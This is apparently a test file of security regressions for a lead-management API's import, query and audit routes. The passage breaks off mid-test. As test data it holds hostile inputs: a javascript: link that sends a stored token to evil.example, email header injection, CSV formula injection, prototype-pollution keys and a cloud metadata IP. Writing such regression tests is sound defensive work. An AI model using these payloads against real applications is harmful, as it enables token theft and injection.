/**
 * Security regressions for everything that takes data IN: the lead import, the public pixel,
 * inbound replies, saved queries - and for the route-level controls around them (role
 * gates, the audit trail, the webhook secret, the click redirect).
 *
 * Each test reproduces an exploit that worked against the code before the fix, and asserts
 * it no longer does. They go through the real app (createApp) and a real database.
 *
 * It runs in its own Postgres schema (`sec_ingest`) when the database allows one, because
 * several tests count queued jobs and another file may drain the shared queue; otherwise it
 * uses unique workspaces in the default schema. `fetch` is stubbed: nothing leaves the
 * machine.
 *
 *   TEST_DATABASE_URL=postgres://user@localhost:5432/scout_test npm test -w apps/api
 */
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { randomBytes, randomUUID } from "node:crypto";

const TEST_DB = process.env.TEST_DATABASE_URL;
const SCHEMA = "sec_ingest";

if (TEST_DB) {
  process.env.DATABASE_URL = TEST_DB;
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET ??= "x".repeat(48);
  process.env.ENCRYPTION_KEY ??= "y".repeat(48);
  process.env.SMTP_PROBE_ENABLED = "false";
  process.env.PILOT_MODE = "false";
  process.env.JOB_MODE = "worker";
  process.env.MAIL_FROM = "Scout <no-reply@platform.test>";
  for (const k of ["RESEND_API_KEY", "SMTP_HOST", "HUNTER_API_KEY", "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "GROQ_API_KEY", "GEMINI_API_KEY", "SERPER_API_KEY", "APOLLO_API_KEY", "STRIPE_SECRET_KEY", "IPINFO_TOKEN", "PILOT_INVITE_CODE"]) delete process.env[k];
}

/** Every email the app tries to send in this file, captured instead of sent. */
const mocks = vi.hoisted(() => ({
  sent: [] as { to: string; from: string; subject: string; text: string; replyTo?: string }[],
  /** Make the next classifyReply call throw, as a provider 429 does. */
  classifyThrows: 0,
  /** Make classifyReply return this (model output we do not control). */
  classifyReturns: null as null | { intent: unknown; confidence: unknown },
}));
vi.mock("./lib/mailer.js", async (importOriginal) => {
  const orig = await importOriginal<typeof import("./lib/mailer.js")>();
  return {
    ...orig,
    sendMail: vi.fn(async (_cfg: unknown, input: { to: string; from: string; subject: string; text: string; replyTo?: string }) => {
      mocks.sent.push(input);
      return { ok: true, provider: "test", providerMessageId: `t-${Date.now()}` };
    }),
  };
});
vi.mock("@prospex/core", async (importOriginal) => {
  const orig = await importOriginal<typeof import("@prospex/core")>();
  return {
    ...orig,
    classifyReply: vi.fn(async (ai: unknown, text: string) => {
      if (mocks.classifyThrows > 0) {
        mocks.classifyThrows--;
        throw new Error("429 Too Many Requests from the model provider");
      }
      if (mocks.classifyReturns) return mocks.classifyReturns as never;
      return orig.classifyReply(ai as never, text);
    }),
  };
});

if (!TEST_DB) {
  process.stderr.write(
    `\n[!] ${JSON.stringify("ingestion security")} did NOT run: TEST_DATABASE_URL is not set.\n` +
      "    These are the tests for the lead import, the public pixel, inbound replies, role gates and the audit trail.\n" +
      "    Run them with: TEST_DATABASE_URL=postgres://user@localhost:5432/scout_test npm test -w apps/api\n",
  );
}

const suite = TEST_DB ? describe : describe.skip;

suite("ingestion and route-level security", () => {
  /* eslint-disable @typescript-eslint/no-explicit-any */
  let app: any;
  let db: any;
  let sql: any;
  let S: any; // @prospex/db

  type Org = { token: string; orgId: string; userId: string; email: string; apiKey: string; memberToken: string; memberEmail: string; memberId: string };
  let A: Org;
  let B: Org;

  const u8 = () => randomUUID().slice(0, 8);
  let ipSeq = 0;
  const ip = () => `198.51.${Math.floor(++ipSeq / 250) % 250}.${(ipSeq % 250) + 1}`;
  const realFetch = globalThis.fetch;
  const egress: string[] = [];

  async function req(method: string, path: string, token?: string | null, body?: unknown, headers: Record<string, string> = {}) {
    const auth = token ? (token.startsWith("px_") ? { "x-api-key": token } : { authorization: `Bearer ${token}` }) : {};
    const raw = typeof body === "string";
    const res = await app.request(path, {
      method,
      headers: { ...auth, ...(body !== undefined && !headers["content-type"] ? { "content-type": "application/json" } : {}), "cf-connecting-ip": ip(), ...headers },
      body: body === undefined ? undefined : raw ? (body as string) : JSON.stringify(body),
    });
    const text = await res.text();
    let json: any = null;
    try {
      json = JSON.parse(text);
    } catch {}
    return { status: res.status, body: json, text, headers: res.headers as Headers };
  }

  async function signup(name: string): Promise<Org> {
    const email = `${name}-${u8()}@example.com`;
    const r = await req("POST", "/v1/auth/signup", null, { email, password: "correct-horse-battery", orgName: `${name} ${u8()}` });
    expect(r.status).toBe(201);
    const orgId = r.body.org.id as string;
    // Roomy limits, so a quota never stands in for the behaviour under test.
    await db.update(S.organizations).set({ plan: "scale", planLimits: S.limitsFor("scale") }).where(S.eq(S.organizations.id, orgId));
    const memberEmail = `member-${u8()}@example.com`;
    const inv = await req("POST", "/v1/tools/team/invite", r.body.token, { email: memberEmail, role: "member" });
    expect(inv.status).toBe(201);
    const join = await req("POST", "/v1/auth/join", null, { token: new URL(inv.body.link).searchParams.get("token"), password: "member-password-1", name: "Member" });
    expect(join.status).toBe(200);
    return { token: r.body.token, orgId, userId: r.body.user.id, email, apiKey: r.body.apiKey, memberToken: join.body.token, memberEmail, memberId: join.body.user.id };
  }

  const lead = async (orgId: string, extra: Record<string, unknown> = {}) => (await db.insert(S.leads).values({ orgId, fullName: "Test Person", email: `p-${u8()}@example.com`, ...extra }).returning())[0];
  const leadsOf = (orgId: string) => db.select().from(S.leads).where(S.eq(S.leads.orgId, orgId));
  const auditOf = async (orgId: string, action?: string) => {
    const rows = await db.select().from(S.auditLog).where(S.eq(S.auditLog.orgId, orgId));
    return action ? rows.filter((r: any) => r.action === action) : rows;
  };
  const importCsv = (token: string, csv: string) => req("POST", "/v1/leads/import", token, csv, { "content-type": "text/csv" });

  beforeAll(async () => {
    try {
      const { default: postgres } = await import("postgres");
      const admin = postgres(TEST_DB!, { max: 1, onnotice: () => {} });
      await admin.unsafe(`CREATE SCHEMA IF NOT EXISTS "${SCHEMA}"`);
      await admin.end({ timeout: 2 });
      process.env.DATABASE_URL = `${TEST_DB}${TEST_DB!.includes("?") ? "&" : "?"}search_path=${SCHEMA}`;
    } catch {
      process.env.DATABASE_URL = TEST_DB;
    }
    vi.stubGlobal("fetch", (async (input: unknown) => {
      const u = typeof input === "string" ? input : input instanceof URL ? input.href : (input as { url: string }).url;
      egress.push(u.slice(0, 120));
      throw new Error("security.ingest: outbound fetch is blocked in this test");
    }) as typeof fetch);
    S = await import("@prospex/db");
    await S.runMigrations(process.env.DATABASE_URL);
    const g = S.getDb();
    db = g.db;
    sql = g.sql;
    const { createApp } = await import("./app.js");
    app = createApp();
    A = await signup("ing-a");
    B = await signup("ing-b");
  }, 120_000);

  afterAll(() => {
    vi.stubGlobal("fetch", realFetch);
  });

  // ── 1. One canonical email, at every ingestion point ──
  describe("canonical email (C2/C8)", () => {
    it("canonicalEmail accepts exactly one bare address and nothing else", async () => {
      const { canonicalEmail } = await import("./services/leads.js");
      expect(canonicalEmail("  Jane.Doe@Example.COM ")).toBe("jane.doe@example.com");
      expect(canonicalEmail("o'brien+tag@sub.example.co.uk")).toBe("o'brien+tag@sub.example.co.uk");
      for (const bad of [
        "a@example.com,b@example.com",
        "a@example.com;b@example.com",
        "a@example.com b@example.com",
        "<victim@example.com>",
        'x@y.z"<w@example.com>',
        '"Jane" <jane@example.com>',
        "jane@example.com (Jane)",
        "jane@@example.com",
        "jane@example",
        "jane@-example.com",
        ".jane@example.com",
        "ja..ne@example.com",
        "jane@exa mple.com",
        "jane@example.com\r\nBcc: x@evil.example",
        `${"a".repeat(65)}@example.com`,
        `${"a".repeat(250)}@example.com`,
        "",
        "n/a",
        null,
        undefined,
        42,
        { email: "a@b.co" },
      ]) expect({ bad, out: canonicalEmail(bad) }).toEqual({ bad, out: null });
    });

    it("the import refuses a row whose email is several addresses or a decorated one, and says why", async () => {
      const t = u8();
      const csv = [
        "name,email,linkedin",
        `Multi Rcpt,"a-${t}@example.com,b-${t}@example.com,c-${t}@example.com",`,
        `Angle,<victim-${t}@example.com>,`,
        `Display,"x@y.z""<w-${t}@example.com>",`,
        `Formula,"=hyperlink(""http://e/""&a1)@x.yz",`,
        `Good One,good-${t}@example.com,`,
        `No Email Yet,n/a,linkedin.com/in/no-email-${t}`,
      ].join("\n");
      const r = await importCsv(A.token, csv);
      expect(r.status).toBe(200);
      expect(r.body.created).toBe(2);
      expect(r.body.skipped).toBe(4);
      expect(r.body.skippedRows.map((x: any) => x.row)).toEqual([1, 2, 3, 4]);
      for (const row of r.body.skippedRows) expect(row.reason).toMatch(/not a single valid email address/);
      expect(r.body.errors).toEqual([]);
      const stored = (await leadsOf(A.orgId)).filter((l: any) => (l.email ?? "").includes(t) || (l.linkedinUrl ?? "").includes(t));
      expect(stored.map((l: any) => l.email).sort()).toEqual([`good-${t}@example.com`, null].sort());
      // A placeholder in the email column is "no email", not a reason to lose the lead; a
      // scheme-less profile link is a web address.
      expect(stored.find((l: any) => !l.email).linkedinUrl).toBe(`https://linkedin.com/in/no-email-${t}`);
      // Nothing with a comma, bracket or quote ever reached the column the mailer reads.
      const dirty = await sql`SELECT count(*)::int AS n FROM leads WHERE org_id = ${A.orgId} AND email ~ '[,;<>" ]'`;
      expect(dirty[0].n).toBe(0);
    });

    it("upsertLead itself never stores a non-canonical email, whoever calls it", async () => {
      const { upsertLead } = await import("./services/leads.js");
      const t = u8();
      const r = await upsertLead(A.orgId, { fullName: `Pipeline ${t}`, email: `a-${t}@example.com, b-${t}@example.com`, emailStatus: "valid", emailConfidence: 0.9, linkedinUrl: "javascript:alert(document.domain)", companyDomain: "169.254.169.254", source: "provider:test" });
      expect(r.emailRejected).toBeTruthy();
      expect(r.lead.email).toBeNull();
      // The verdict belonged to the address that was refused.
      expect(r.lead.emailStatus).toBe("unknown");
      expect(r.lead.verifiedAt).toBeNull();
      expect(r.lead.linkedinUrl).toBeNull();
      expect(r.lead.companyId).toBeNull();
      expect((r.lead.raw as any).emailRejected.reason).toMatch(/not a single valid email/);
      // A good one is canonicalised on the way in.
      const ok = await upsertLead(A.orgId, { fullName: `Fine ${t}`, email: `  MiXed-${t}@Example.COM ` });
      expect(ok.lead.email).toBe(`mixed-${t}@example.com`);
      expect(ok.emailRejected).toBeUndefined();
    });

    it("POST and PATCH /v1/leads store the canonical form and refuse anything else", async () => {
      const t = u8();
      const made = await req("POST", "/v1/leads", A.token, { fullName: "Canon", email: ` Canon-${t}@Example.com ` });
      expect(made.status).toBe(201);
      expect(made.body.lead.email).toBe(`canon-${t}@example.com`);
      expect((await req("POST", "/v1/leads", A.token, { fullName: "X", email: `a-${t}@example.com,b-${t}@example.com` })).status).toBe(400);
      expect((await req("PATCH", `/v1/leads/${made.body.lead.id}`, A.token, { email: `<x-${t}@example.com>` })).status).toBe(400);
      const patched = await req("PATCH", `/v1/leads/${made.body.lead.id}`, A.token, { email: `NEW-${t}@Example.com` });
      expect(patched.status).toBe(200);
      expect(patched.body.email).toBe(`new-${t}@example.com`);
    });

    it("suppressions are stored canonical, so a send-time lookup cannot miss on case", async () => {
      const t = u8();
      const r = await req("POST", "/v1/leads/suppressions", A.token, { emails: [` Stop-${t}@Example.COM `, `stop-${t}@example.com`] });
      expect(r.status).toBe(200);
      expect(r.body.added).toBe(1);
      const rows = await db.select().from(S.suppressions).where(S.and(S.eq(S.suppressions.orgId, A.orgId), S.eq(S.suppressions.email, `stop-${t}@example.com`)));
      expect(rows).toHaveLength(1);
      expect((await req("POST", "/v1/leads/suppressions", A.token, { emails: ["a@example.com,b@example.com"] })).status).toBe(400);
    });

    it("the upgrade-request form and the email tools take one address", async () => {
      expect((await req("POST", "/v1/upgrade-requests", null, { name: "N", email: "a@example.com, b@example.com", mobile: "+15550100", country: "US", planId: "starter" })).status).toBe(400);
      expect((await req("POST", "/v1/tools/email-to-linkedin", A.token, { emails: ["<a@example.com>"] })).status).toBe(400);
    });
  });

  // ── 1b. The import is held to the DTO ──
  describe("import validation (C2)", () => {
    it("refuses javascript: and data: profile links, on POST and in the import", async () => {
      const t = u8();
      expect((await req("POST", "/v1/leads", A.token, { fullName: "X", linkedinUrl: "javascript:alert(1)" })).status).toBe(400);
      expect((await req("POST", "/v1/leads", A.token, { fullName: "X", linkedinUrl: "data:text/html;base64,PHNjcmlwdD4=" })).status).toBe(400);
      const made = await req("POST", "/v1/leads", A.token, { fullName: "Ok", linkedinUrl: `https://www.linkedin.com/in/ok-${t}` });
      expect(made.status).toBe(201);
      // Pasted without a scheme: a web address, stored with https://.
      const bare = await req("POST", "/v1/leads", A.token, { fullName: "Bare", linkedinUrl: `linkedin.com/in/bare-${t}` });
      expect(bare.status).toBe(201);
      expect(bare.body.lead.linkedinUrl).toBe(`https://linkedin.com/in/bare-${t}`);
      expect((await req("PATCH", `/v1/leads/${made.body.lead.id}`, A.token, { linkedinUrl: "javascript:fetch('//evil.example/'+localStorage['gl.token'])" })).status).toBe(400);
      const r = await importCsv(A.token, `name,email,linkedin\nJs ${t},js-${t}@example.com,javascript:alert(document.domain)\nData ${t},data-${t}@example.com,data:text/html;base64\n`);
      expect(r.body.created).toBe(0);
      expect(r.body.skipped).toBe(2);
      for (const row of r.body.skippedRows) expect(row.reason).toMatch(/http:\/\/ or https:\/\//);
      const bad = await sql`SELECT count(*)::int AS n FROM leads WHERE org_id = ${A.orgId} AND linkedin_url IS NOT NULL AND linkedin_url !~* '^https?://'`;
      expect(bad[0].n).toBe(0);
    });

    it("refuses oversized fields row by row instead of storing them", async () => {
      const t = u8();
      const csv = `name,email,title,notes\n${"N".repeat(50_000)},big1-${t}@example.com,CEO,x\nOk Name,big2-${t}@example.com,${"T".repeat(100_000)},x\nOk Name,big3-${t}@example.com,CEO,${"c".repeat(5_000)}\nFine,fine-${t}@example.com,CEO,short\n`;
      const r = await importCsv(A.token, csv);
      expect(r.status).toBe(200);
      expect(r.body.created).toBe(1);
      expect(r.body.skippedRows.map((x: any) => x.row)).toEqual([1, 2, 3]);
      expect(r.body.skippedRows[0].reason).toMatch(/Full name/);
      expect(r.body.skippedRows[1].reason).toMatch(/Title/);
      expect(r.body.skippedRows[2].reason).toMatch(/too long/);
      const longest = await sql`SELECT coalesce(max(length(full_name)),0)::int AS n, coalesce(max(length(title)),0)::int AS t, coalesce(max(length(custom::text)),0)::int AS c FROM leads WHERE org_id = ${A.orgId}`;
      expect(longest[0].n).toBeLessThanOrEqual(200);
      expect(longest[0].t).toBeLessThanOrEqual(300);
      expect(longest[0].c).toBeLessThan(250_000);
    });

    it("caps columns per row and custom fields per lead", async () => {
      const t = u8();
      // 100,000 columns in one row
      const wideHeader = ["name", "email", ...Array.from({ length: 100_000 }, (_, i) => `c${i}`)].join(",");
      const wideRow = [`Wide ${t}`, `wide-${t}@example.com`, ...Array.from({ length: 100_000 }, () => "v")].join(",");
      const wide = await importCsv(A.token, `${wideHeader}\n${wideRow}\n`);
      expect(wide.status).toBe(200);
      expect(wide.body.created).toBe(0);
      expect(wide.body.skippedRows[0].reason).toMatch(/more than 200 columns/);
      // 150 extra columns: under the column cap, over the custom-field cap
      const h = ["name", "email", ...Array.from({ length: 150 }, (_, i) => `x${i}`)].join(",");
      const row = [`Many ${t}`, `many-${t}@example.com`, ...Array.from({ length: 150 }, () => "v")].join(",");
      const many = await importCsv(A.token, `${h}\n${row}\n`);
      expect(many.body.created).toBe(0);
      expect(many.body.skippedRows[0].reason).toMatch(/Too many custom fields/);
      // JSON: a nested multi-megabyte custom object
      const big = await req("POST", "/v1/leads/import", A.token, [{ name: `Json ${t}`, email: `json-${t}@example.com`, blob: { deep: "z".repeat(300_000) } }]);
      expect(big.body.created).toBe(0);
      expect(big.body.skippedRows[0].reason).toMatch(/too long/);
      // the same custom limits on POST
      const custom = Object.fromEntries(Array.from({ length: 101 }, (_, i) => [`k${i}`, 1]));
      expect((await req("POST", "/v1/leads", A.token, { fullName: "X", custom })).status).toBe(400);
      expect((await req("POST", "/v1/leads", A.token, { fullName: "X", custom: { note: "y".repeat(2001) } })).status).toBe(400);
    });

    it("refuses non-text values in mapped fields, and maps the documented JSON keys", async () => {
      const t = u8();
      const r = await req("POST", "/v1/leads/import", A.token, [
        { name: { first: "obj" }, email: `o-${t}@example.com` },
        { name: `Arr ${t}`, title: ["a", "b"], email: `arr-${t}@example.com` },
        { name: 12345, email: `num-${t}@example.com` },
        { firstName: "Camel", lastName: `Case${t}`, email: `camel-${t}@example.com`, companyDomain: "https://www.camel-co.test/about", companyName: "Camel Co", tags: ["vip"], custom: { tier: "gold" }, phone: 14155550100 },
      ]);
      expect(r.status).toBe(200);
      expect(r.body.created).toBe(1);
      expect(r.body.skippedRows.map((x: any) => x.row)).toEqual([1, 2, 3]);
      for (const row of r.body.skippedRows) expect(row.reason).toMatch(/must be text/);
      const [camel] = await db.select().from(S.leads).where(S.and(S.eq(S.leads.orgId, A.orgId), S.eq(S.leads.email, `camel-${t}@example.com`)));
      expect(camel).toMatchObject({ firstName: "Camel", lastName: `Case${t}`, phone: "14155550100", tags: ["vip"] });
      expect(camel.custom).toEqual({ tier: "gold" });
      expect(camel.companyId).toBeTruthy();
      expect(await sql`SELECT count(*)::int AS n FROM leads WHERE org_id = ${A.orgId} AND full_name LIKE '%object Object%'`).toEqual([{ n: 0 }]);
    });

    it("cannot be used to set server-owned fields or reach a prototype", async () => {
      const t = u8();
      const r = await req("POST", "/v1/leads/import", A.token, JSON.stringify([{ name: `Mass ${t}`, email: `mass-${t}@example.com`, emailStatus: "valid", score: 100, orgId: B.orgId, id: randomUUID(), status: "customer", verifiedAt: "2020-01-01", __proto__: { polluted: "yes" }, constructor: { prototype: { polluted: "yes2" } } }]).replace('"__proto__"', '"__proto__"'));
      expect(r.status).toBe(200);
      const [l] = await db.select().from(S.leads).where(S.and(S.eq(S.leads.orgId, A.orgId), S.eq(S.leads.email, `mass-${t}@example.com`)));
      expect(l).toMatchObject({ orgId: A.orgId, emailStatus: "unknown", score: 0, status: "new", verifiedAt: null, emailVerifiedBy: null });
      expect(Object.keys(l.custom)).not.toContain("constructor");
      expect(Object.keys(l.custom)).not.toContain("__proto__");
      expect(({} as any).polluted).toBeUndefined();
      expect((await leadsOf(B.orgId)).some((x: any) => x.email === `mass-${t}@example.com`)).toBe(false);
    });

    it("never returns a database message, and stores text with NUL bytes cleaned", async () => {
      const t = u8();
      const r = await importCsv(A.token, `name,email,title\nNul\u0000 Byte ${t},nul-${t}@example.com,C\u0000EO\n`);
      expect(r.status).toBe(200);
      expect(r.body.created).toBe(1);
      expect(r.body.errors).toEqual([]);
      expect(r.text).not.toMatch(/insert into|Failed query|params:/i);
      const [l] = await db.select().from(S.leads).where(S.and(S.eq(S.leads.orgId, A.orgId), S.eq(S.leads.email, `nul-${t}@example.com`)));
      expect(l.fullName).toBe(`Nul Byte ${t}`);
      expect(l.title).toBe("CEO");
      // JSON import with a NUL in a value and in a key
      const j = await req("POST", "/v1/leads/import", A.token, [{ name: `J\u0000son ${t}`, email: `jnul-${t}@example.com`, ["k\u0000ey"]: "v\u0000al" }]);
      expect(j.body.created).toBe(1);
      expect(j.text).not.toMatch(/insert into|Failed query/i);
    });

    it("says so when the file ends inside a quoted cell, and does not import the rest of the file as one lead", async () => {
      const t = u8();
      const r = await importCsv(A.token, `name,email\n"Unclosed ${t},a-${t}@example.com\n${Array.from({ length: 40 }, (_, i) => `Person ${i},p${i}-${t}@example.com`).join("\n")}\n`);
      expect(r.status).toBe(200);
      expect(r.body.created).toBe(0);
      expect(r.body.warnings?.[0]).toMatch(/quoted cell/);
      expect(r.body.skippedRows[0]).toMatchObject({ row: 1 });
      expect(r.body.skippedRows[0].reason).toMatch(/never closed/);
      // The short version too: three lines, small enough to pass every length rule.
      const short = await importCsv(A.token, `name,email\nGood ${t},good2-${t}@example.com\n"Unclosed ${t},a2-${t}@example.com\nThird ${t},c2-${t}@example.com\n`);
      expect(short.body).toMatchObject({ created: 1, skipped: 1 });
      expect(short.body.skippedRows[0]).toMatchObject({ row: 2 });
      expect(await sql`SELECT count(*)::int AS n FROM leads WHERE org_id = ${A.orgId} AND full_name LIKE ${"Unclosed " + t + "%"}`).toEqual([{ n: 0 }]);
    });

    it("keeps the 5000-row cap for CSV and JSON", async () => {
      const rows = Array.from({ length: 5001 }, (_, i) => ({ name: `R${i}` }));
      const r = await req("POST", "/v1/leads/import", A.token, rows);
      expect(r.status).toBe(400);
      expect(r.body.error.message).toMatch(/Max 5000/);
    });
  });

  // ── 2. Stored queries ──
  describe("saved-search and autopilot queries (C3)", () => {
    it("refuses a stored query the interactive search would refuse", async () => {
      const big = { query: "cto", limit: 100000 };
      expect((await req("POST", "/v1/tools/saved-searches", A.token, { name: "s", query: big })).status).toBe(400);
      expect((await req("POST", "/v1/tools/autopilots", A.token, { name: "a", query: big })).status).toBe(400);
      const domains = { query: "cto", companyDomains: Array.from({ length: 10_000 }, (_, i) => `d${i}.example.com`) };
      expect((await req("POST", "/v1/tools/saved-searches", A.token, { name: "s", query: domains })).status).toBe(400);
      expect((await req("POST", "/v1/tools/autopilots", A.token, { name: "a", query: domains })).status).toBe(400);
      expect((await req("POST", "/v1/tools/saved-searches", A.token, { name: "s", query: { titles: Array.from({ length: 500 }, (_, i) => `T${i}`) } })).status).toBe(400);
      const ap = await req("POST", "/v1/tools/autopilots", A.token, { name: "ok", query: { query: "cto" }, active: false });
      expect(ap.status).toBe(201);
      expect((await req("PATCH", `/v1/tools/autopilots/${ap.body.id}`, A.token, { query: big })).status).toBe(400);
    });

    it("stores only the keys a search takes", async () => {
      const r = await req("POST", "/v1/tools/saved-searches", A.token, { name: "strip", query: { query: "cto", limit: 200, verify: { hunterApiKey: "tenant-key" }, maxProviderLeads: 9999, allowPrivateHosts: true, ai: { provider: "x" } } });
      expect(r.status).toBe(201);
      expect(Object.keys(r.body.query).sort()).toEqual(["limit", "query"]);
      const ap = await req("POST", "/v1/tools/autopilots", A.token, { name: "strip", query: { query: "cto", maxProviderLeads: 9999, country: "IN" }, active: false });
      expect(Object.keys(ap.body.query).sort()).toEqual(["country", "query"]);
    });

    it("clampSearchQuery brings a legacy row inside the limits without throwing", async () => {
      const { clampSearchQuery } = await import("./lib/searchQuery.js");
      const out = clampSearchQuery({ query: "q".repeat(5000), limit: 100000, companyDomains: Array.from({ length: 10_000 }, (_, i) => `d${i}.test`), titles: Array.from({ length: 500 }, (_, i) => `T${i}`), maxProviderLeads: 5, verify: {}, ai: {}, icpId: "not-a-uuid", clientId: A.orgId, findEmails: "yes" });
      expect(out.limit).toBe(200);
      expect(out.companyDomains).toHaveLength(50);
      expect(out.titles).toHaveLength(10);
      expect(out.query).toHaveLength(500);
      expect(Object.keys(out).sort()).toEqual(["clientId", "companyDomains", "limit", "query", "titles"]);
      expect(clampSearchQuery(null)).toEqual({});
      expect(clampSearchQuery("x")).toEqual({});
    });
  });

  // ── 3. Audit trail ──
  describe("audit trail (C4)", () => {
    it("records exports, bulk deletes, imports and list deletes - with counts, not content", async () => {
      const O = await signup("aud");
      const tag = `aud-${u8()}`;
      const one = await lead(O.orgId, { tags: [tag] });
      const two = await lead(O.orgId, { tags: [tag] });
      expect((await req("GET", `/v1/leads/export.csv?tag=${tag}`, O.memberToken)).status).toBe(200);
      const [exp] = await auditOf(O.orgId, "leads.exported");
      expect(exp).toMatchObject({ result: "ok", actorType: "user", actorUserId: O.memberId });
      expect(exp.data).toMatchObject({ rows: 2, format: "csv", filters: { tag } });
      expect(exp.ip).toBeTruthy();
      expect(JSON.stringify(exp.data)).not.toContain(one.email);

      await importCsv(O.token, `name,email\nA ${tag},a-${tag}@example.com\n`);
      expect((await auditOf(O.orgId, "leads.imported"))[0].data).toMatchObject({ format: "csv", rows: 1, created: 1, skipped: 0 });

      // Members work the lead list: export and bulk delete stay open to them, and audited.
      const del = await req("POST", "/v1/leads/bulk/delete", O.memberToken, { ids: [one.id, two.id] });
      expect(del.status).toBe(200);
      expect((await auditOf(O.orgId, "leads.bulk_deleted"))[0].data).toMatchObject({ requested: 2, deleted: 2 });

      const list = await req("POST", "/v1/leads/lists", O.token, { name: "L" });
      await req("DELETE", `/v1/leads/lists/${list.body.id}`, O.token);
      expect((await auditOf(O.orgId, "list.deleted"))[0]).toMatchObject({ targetId: list.body.id });

      await req("POST", "/v1/leads/suppressions", O.token, { emails: [`s-${tag}@example.com`] });
      expect((await auditOf(O.orgId, "suppression.added"))[0].data).toMatchObject({ added: 1 });
    });

    it("records team, client, campaign, sender, pixel, autopilot, webhook and integration changes, without secrets", async () => {
      const O = await signup("aud2");
      const actions = async () => (await auditOf(O.orgId)).map((r: any) => r.action);

      const target = `inv-${u8()}@example.com`;
      const inv = await req("POST", "/v1/tools/team/invite", O.token, { email: target });
      await req("POST", `/v1/tools/team/invites/${inv.body.id}/resend`, O.token);
      await req("DELETE", `/v1/tools/team/invites/${inv.body.id}`, O.token);
      await req("DELETE", `/v1/tools/team/${O.memberId}`, O.token);

      const client = await req("POST", "/v1/clients", O.token, { name: `C ${u8()}` });
      const share1 = await req("POST", `/v1/clients/${client.body.id}/share`, O.token);
      const share2 = await req("POST", `/v1/clients/${client.body.id}/share`, O.token);
      await req("DELETE", `/v1/clients/${client.body.id}/share`, O.token);
      await req("DELETE", `/v1/clients/${client.body.id}`, O.token);

      const sender = await req("POST", "/v1/campaigns/email-accounts", O.token, { provider: "system", fromName: "Sender", fromEmail: O.email });
      expect(sender.status).toBe(201);
      const cp = await req("POST", "/v1/campaigns", O.token, { name: "Camp", emailAccountId: sender.body.emailAccount.id, steps: [{ subjectTemplate: "Hi", bodyTemplate: "Hello", aiPersonalize: false }] });
      await req("POST", `/v1/campaigns/${cp.body.id}/start`, O.token);
      await req("POST", `/v1/campaigns/${cp.body.id}/pause`, O.token);
      await req("DELETE", `/v1/campaigns/${cp.body.id}`, O.token);
      await req("DELETE", `/v1/campaigns/email-accounts/${sender.body.emailAccount.id}`, O.token);

      const px = await req("POST", "/v1/visitors/pixels", O.token, { name: "Site" });
      await req("DELETE", `/v1/visitors/pixels/${px.body.id}`, O.token);
      const ap = await req("POST", "/v1/tools/autopilots", O.token, { name: "AP", query: { query: "cto" }, active: false });
      await req("DELETE", `/v1/tools/autopilots/${ap.body.id}`, O.token);

      const hook = await req("POST", "/v1/webhooks", O.token, { url: "https://user:hunter2@hooks.example.com/in?token=querysecret" });
      expect(hook.status).toBe(201);
      await req("POST", `/v1/webhooks/${hook.body.id}/test`, O.token);
      const rot = await req("POST", `/v1/webhooks/${hook.body.id}/rotate-secret`, O.token);
      await req("DELETE", `/v1/webhooks/${hook.body.id}`, O.token);

      const integ = await req("PUT", "/v1/integrations/hubspot", O.token, { config: { accessToken: "super-secret-crm-token" } });
      expect(integ.status).toBe(200);
      const l = await lead(O.orgId);
      await req("POST", "/v1/integrations/hubspot/sync", O.token, { leadIds: [l.id] });
      await req("DELETE", "/v1/integrations/hubspot", O.token);

      const seen = await actions();
      for (const a of [
        "team.invited", "team.invite_resent", "team.invite_revoked", "team.member_removed", "team.joined",
        "client.created", "client.share_enabled", "client.share_rotated", "client.share_disabled", "client.deleted",
        "sender.created", "sender.deleted", "campaign.started", "campaign.paused", "campaign.deleted",
        "pixel.created", "pixel.deleted", "autopilot.created", "autopilot.deleted",
        "webhook.created", "webhook.tested", "webhook.secret_rotated", "webhook.deleted",
        "integration.connected", "integration.synced", "integration.disconnected",
      ]) expect(seen, `missing audit action ${a}`).toContain(a);

      // No secret of any kind in the trail.
      const all = JSON.stringify(await auditOf(O.orgId));
      for (const secret of [hook.body.secret, rot.body.secret, share1.body.shareToken, share2.body.shareToken, "super-secret-crm-token", "hunter2", "querysecret", "member-password-1", new URL(inv.body.link).searchParams.get("token")!]) {
        expect(secret).toBeTruthy();
        expect(all).not.toContain(secret);
      }
    });

    it("records a refusal: a member reaching for an owner action, and a reference to another workspace's row", async () => {
      const O = await signup("aud3");
      const hook = await req("POST", "/v1/webhooks", O.token, { url: "https://hooks.example.com/in" });
      expect((await req("POST", `/v1/webhooks/${hook.body.id}/rotate-secret`, O.memberToken)).status).toBe(403);
      const theirs = await db.insert(S.icps).values({ orgId: B.orgId, name: "theirs" }).returning();
      expect((await req("POST", "/v1/leads", O.token, { fullName: "X", icpId: theirs[0].id })).status).toBe(404);
      const denied = (await auditOf(O.orgId)).filter((r: any) => r.result === "denied");
      expect(denied.find((r: any) => r.action === "webhook.secret_rotated")).toMatchObject({ actorUserId: O.memberId, data: { reason: "role", role: "member" } });
      expect(denied.find((r: any) => r.action === "reference.denied")).toMatchObject({ targetType: "icp", targetId: theirs[0].id, actorUserId: O.userId });
      // ... and nothing lands in the other workspace's trail.
      expect((await auditOf(B.orgId)).some((r: any) => r.targetId === theirs[0].id)).toBe(false);
    });
  });

  // ── 4. Errors ──
  describe("database errors and logs (C5)", () => {
    it("a NUL byte in any validated body is removed, not a 500", async () => {
      const t = u8();
      const made = await req("POST", "/v1/leads", A.token, { fullName: `Nu\u0000l ${t}`, title: "C\u0000TO" });
      expect(made.status).toBe(201);
      expect(made.body.lead.fullName).toBe(`Nul ${t}`);
      const list = await req("POST", "/v1/leads/lists", A.token, { name: `Li\u0000st ${t}` });
      expect(list.status).toBe(201);
      expect(list.body.name).toBe(`List ${t}`);
      expect((await req("GET", `/v1/leads?q=${encodeURIComponent("a\u0000b")}`, A.token)).status).toBe(200);
    });

    it("maps a rejected value to a generic 400 and never logs or returns the statement", async () => {
      const { Hono } = await import("hono");
      const { errorHandler, describeError, redactMessage } = await import("./lib/errors.js");
      const h = new Hono();
      h.onError(errorHandler as never);
      const hash = "$2a$10$abcdefghijklmnopqrstuuABCDEFGHIJKLMNOPQRSTUVWXYZ01234";
      const driver = Object.assign(new Error('invalid byte sequence for encoding "UTF8": 0x00'), { code: "22021" });
